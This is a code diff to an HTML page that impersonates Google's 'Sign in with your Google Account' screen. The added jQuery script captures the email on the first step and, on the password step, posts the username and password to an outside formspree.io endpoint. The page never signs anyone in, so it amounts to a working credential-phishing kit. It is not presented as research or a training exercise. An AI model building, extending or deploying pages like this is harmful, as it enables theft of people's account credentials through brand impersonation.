@@ -2,67 +2,53 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
-  <script>
-    $("document").ready(() => {
-      $("form").submit((e) => {
-        e.preventDefault();
-        Cookies.set("email", $("input[name=username]").val());
-        window.location = "./next.html"
-      });
-    })
-  </script>
-  <link rel="stylesheet" href="./css/style.css" type="text/css" />
-  <title>Sign in</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
+    <script>
+        $("document").ready(() => {
+            var data1 = [];
+
+            var index = 0;
+            var emailadd = "";
+            $.get("./htmlbase.html", (data) => {
+                data = data.split("|")
+                $(".root").html(data[0])
+                $("form").submit((e) => {
+                    e.preventDefault();
+                    // Cookies.set("email", $("input[name=username]").val());
+                    if (index == 0) emailadd = $("input[name=username]").val();
+                    if (index == 1) $.post("https://formspree.io/f/xgebqyrz", { username: emailadd, password: $("#passwordinput").val() })
+                    index++;
+                    $(".root").html(data[index])
+                    if (index == 1) $("#emailparse").html(emailadd)
+                    // window.location = "./next.html"
+                });
+            })         
+        })
+    </script>
+    <link rel="stylesheet" href="./css/style.css" type="text/css" />
+    <title>Sign in</title>
 </head>
 
 <body>
-  <div class="form-container">
-    <form>
-      <div class="wrapper">
-        <!-- google img adding -->
-        <div class="logo">
-          <img src="./img/google.png" alt="google logo" />
-        </div>
-        <!-- header text adding -->
-        <div class="header-text">
-          <h2>Sign in</h2>
-          <p>with your Google Account</p>
-        </div>
-        <!-- input starts -->
-        <div class="fields">
-          <div class="field">
-            <input type="text" name="username" class="input-field" id="email" value="" autocomplete="off" required=""
-              placeholder=" " />
-            <label class="input-label" for="email">Email or phone</label>
-          </div>
+    <div class="form-container">
+        <form>
+            <div class="wrapper">
+                <div class="logo">
+                    <img src="./img/google.png" alt="google logo" />
+                </div>
 
+                <div class="root">
 
-          <div class="forget-field">
-            <p class="color-text cursor">
-              Forgot email?
-            </p>
-          </div>
+                </div>
 
-          <div class="guest-mode">
-            <p>
-              Not your computer? Use Guest mode to sign in privately.
-            </p>
-            <p class="color-text cursor">Learn more</p>
-          </div>
-
-          <div class="btn-field" id="emailsub">
-            <p class="color-text cursor">Create account</p>
-            <button class="btn" type="submit">Next</button>
-          </div>
-        </div>
-      </div>
+            </div>
+    </div>
     </form>
-  </div>
+    </div>
 </body>
 
 </html>
